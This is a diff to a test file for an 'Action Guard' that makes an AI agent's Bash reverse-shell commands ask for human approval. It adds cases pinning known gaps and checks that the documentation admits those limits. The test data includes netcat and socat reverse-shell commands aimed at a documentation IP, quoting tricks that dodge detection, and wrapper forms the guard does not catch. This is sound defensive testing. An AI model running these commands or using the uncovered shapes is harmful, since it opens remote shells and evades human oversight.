@@ -338,6 +338,11 @@ const RESIDUAL: Array<[string, string, Record<string, unknown>, Record<string, u
   ['n"c"', 'Bash', { command: 'n"c" -e /bin/sh 192.0.2.1 4444' }, B],
   ['-"e"', 'Bash', { command: 'nc -"e" /bin/sh 192.0.2.1 4444' }, B],
   ['socat SOCKET-CONNECT', 'Bash', { command: 'socat SOCKET-CONNECT:2:1:6:0002115c7f0000010000000000000000 EXEC:/bin/sh' }, B],
+  // Not covered (Case, review 5994115085; the README says so): a function body, a `case` arm, and netcat
+  // output piped into a wrapper before the shell. Pinned at their current verdict, not widened in this round.
+  ['function body', 'Bash', { command: 'f(){ nc h 4444 -e /bin/sh; }; f' }, B],
+  ['case arm', 'Bash', { command: 'case x in x) nc h 4444 -e /bin/sh;; esac' }, B],
+  ['nc | env sh', 'Bash', { command: 'nc h 4444 | env sh' }, B],
 ];
 
 describe('#1005 — every reverse-shell shape asks for approval', () => {
@@ -488,7 +493,8 @@ describe('#1005 — the other surfaces know the signal', () => {
     for (const fact of [
       'Action Guard is off by default', '`reverse-shell` signal', 'dangerous approval tier', 'never a block',
       'never the catastrophic tier', 'four families', 'netcat', 'socat', '`/dev/tcp`', 'piped into netcat',
-      'Only the terminal approval prompt can approve it', 'not tap-eligible', 'fall back to a copy of the same pattern',
+      'Only a human answer releases it', 'An `actionGuard.autoApprove` entry never releases it', 'approval-broker pre-clear',
+      'watch-only advisory mode', 'does not read into a function body', '`case` arm', '`nc h 4444 | env sh`', 'not tap-eligible', 'fall back to a copy of the same pattern',
       'does not catch every one', 'not a complete defence', 'Not covered',
     ]) expect({ fact, present: para!.includes(fact) }).toEqual({ fact, present: true });
     for (const claim of [/\bprevents?\b/i, /\bevery reverse shell\b/i, /\bfully\b/i, /\bcomprehensive\b/i, /\bguarantee/i]) {
